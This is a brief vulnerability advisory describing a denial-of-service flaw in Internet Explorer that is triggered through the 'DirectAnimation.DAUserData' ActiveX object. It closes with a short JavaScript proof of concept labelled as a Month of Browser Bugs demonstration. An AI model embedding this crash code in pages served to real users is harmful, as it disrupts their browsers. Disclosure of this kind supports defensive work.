Microsoft Internet Explorer is prone to a denial-of-service vulnerability.

This issue is triggered when an attacker convinces a victim user to visit a malicious website that uses the 'DirectAnimation.DAUserData' object in a malicious manner.

Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.

// MoBB Demonstration
function Demo() {
	var a = new ActiveXObject('DirectAnimation.DAUserData');
	a.Data = 'Hello';
}
